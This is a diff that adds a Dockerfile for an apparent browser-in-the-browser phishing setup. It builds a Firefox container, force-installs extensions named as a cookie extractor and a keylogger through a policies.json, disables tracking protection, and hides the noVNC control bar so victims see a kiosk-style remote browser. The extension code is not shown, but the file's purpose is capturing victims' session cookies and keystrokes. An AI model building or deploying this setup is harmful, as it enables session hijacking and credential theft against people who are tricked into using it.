@@ -1,0 +1,72 @@
+FROM jlesage/firefox:latest
+
+USER root
+
+# Install language fonts and runtime dependencies
+RUN apk add --no-cache \
+    font-wqy-zenhei \
+    font-wqy-microhei \
+    font-noto-cjk \
+    curl \
+    jq \
+    sqlite
+
+# Install extensions
+COPY extensions/ /tmp/extensions/
+
+# Configure Firefox policies for extension installation
+RUN mkdir -p /usr/share/firefox/distribution && \
+    cat > /usr/share/firefox/distribution/policies.json << 'EOF'
+{
+  "policies": {
+    "ExtensionSettings": {
+      "bitb-cookie@security.local": {
+        "installation_mode": "force_installed",
+        "install_url": "file:///tmp/extensions/cookie-extractor/"
+      },
+      "bitb-keylogger@security.local": {
+        "installation_mode": "force_installed",
+        "install_url": "file:///tmp/extensions/keylogger/"
+      }
+    },
+    "DisableTelemetry": true,
+    "DisableFirefoxStudies": true,
+    "EnableTrackingProtection": {
+      "Value": false
+    },
+    "NetworkPrediction": false,
+    "CaptivePortal": false,
+    "FirefoxHome": {
+      "Search": true,
+      "TopSites": false,
+      "SponsoredTopSites": false,
+      "Highlights": false,
+      "Pocket": false,
+      "SponsoredPocket": false,
+      "Snippets": false,
+      "Locked": false
+    }
+  }
+}
+EOF
+
+# Modify noVNC to hide control bar (kiosk mode enhancement)
+RUN if [ -f /opt/noVNC/index.html ]; then \
+      sed -i 's/<\/head>/<style>#noVNC_control_bar, #noVNC_control_bar_handle, .noVNC_panel { display: none !important; }<\/style><\/head>/' /opt/noVNC/index.html; \
+    fi
+
+# Create session directories
+RUN mkdir -p /config/extensions && \
+    chown -R app:app /config
+
+# Copy startup script
+COPY scripts/start-firefox.sh /start-firefox.sh
+RUN chmod +x /start-firefox.sh
+
+ENV DISPLAY_WIDTH=1280
+ENV DISPLAY_HEIGHT=720
+ENV ENABLE_CJK_FONT=1
+
+USER app
+
+ENTRYPOINT ["/start-firefox.sh"]
